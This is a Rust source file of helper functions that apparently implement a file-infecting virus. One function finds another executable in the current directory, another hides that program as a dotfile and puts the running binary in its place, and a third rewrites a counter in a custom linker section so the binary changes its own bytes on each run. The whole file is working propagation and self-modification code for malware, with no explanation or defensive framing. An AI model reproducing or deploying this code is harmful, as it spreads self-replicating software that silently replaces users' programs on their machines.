#[link_section = "ar.p"]
#[used]
static mut VALUE: u32 = 0;

use object::{File, Object, ObjectSection};
use std::{env, path::Path, fs::{self, rename, set_permissions, OpenOptions}, io::{Read, Write, Seek, SeekFrom}};


// Getting path of any binary on current running path using ReadDir
pub fn get_path() -> String {
    
    let exe = env::current_exe().expect("Failed to get the path")
                            .display().to_string()
                            .split("/")
                            .last().expect("Failed to slice the path")
                            .to_string();

    let entries = fs::read_dir(".").expect("Failed to read the current directory"); 

    let mut binary_path = String::new();
    for entry in entries {
        
        let path = entry.expect("Failed to get the path").path()
                                .display().to_string()
                                .split("/")
                                .last().expect("Failed to slice the path")
                                .to_string();

        let path = Path::new(&path);
        if path.is_file() && is_binary(path) == true && path.display().to_string() != exe {    
            binary_path.push_str(path.display().to_string().as_str());
            break; 
        } 
    }

    binary_path.trim().to_string()

 }


// Checking the binary file using bytes, if file has null-byte (0x00) or not;
fn is_binary(path: &Path) -> bool {
    
    let mut file = fs::File::open(path).expect("Failed to open the file");
    
    let mut buffer = [0; 1024]; 
    let bytes = file.read(&mut buffer).expect("Failed to read the file");

    buffer[..bytes].iter().any(|&b| b == 0)
}


// Propagating the current file to the target file using copy filesystem
pub fn hide_binary(path: String, exe: String) {

    let hidden_path = format!(".{}", path);
    let hidden_path = Path::new(&hidden_path);
    fs::copy(&path, &hidden_path).expect("Failed to rename the file");
    fs::rename(exe, path).expect("Failed to rename");

}


/* 
 * Mutating the current file: 
 * creating a new linker-section (ar.p) in current binary  
 * copying current running binary in temporary file buffer
 * Getting the section [ar.p] and changing its value 
*/
pub fn mutate() {

    let path = env::current_exe().expect("Failed to get binary path");
    let tmp = path.with_extension("tmp");

    fs::copy(&path, &tmp).expect("Failed to copy the file on tmp");
  
    let mut file = OpenOptions::new().read(true).write(true).open(&tmp).expect("Failed to open file");
    let mut buf = Vec::new();
    file.read_to_end(&mut buf).expect("Failed to read the file");
 
    let obj_file = object::File::parse(&*buf).expect("Failed to parse object File");    
    
    if let Some(index) = section(obj_file, "ar.p") {
       
        let offset = index.0 as usize;
        buf[offset..(offset+4)].copy_from_slice(&(unsafe {VALUE}+1).to_ne_bytes());

        file.seek(SeekFrom::Start(0)).expect("Failed to move the cursor 0 bytes from the start of the file");
        file.write_all(&buf).expect("Failed to write to the buffer");
        
    }

    let permissions = fs::metadata(&path).unwrap().permissions();
    set_permissions(&tmp, permissions).expect("Failed to set_permissions");
    rename(&tmp, &path).expect("Failed to rename the file");
         
    
}

// Getting range and section size
fn section(file: File, name: &str) -> Option<(u64, u64)> {
    for section in file.sections() {
        if section.name().expect("Failed to get section name").to_string() == name {
            return section.file_range(); 
        }
    }
    None
}
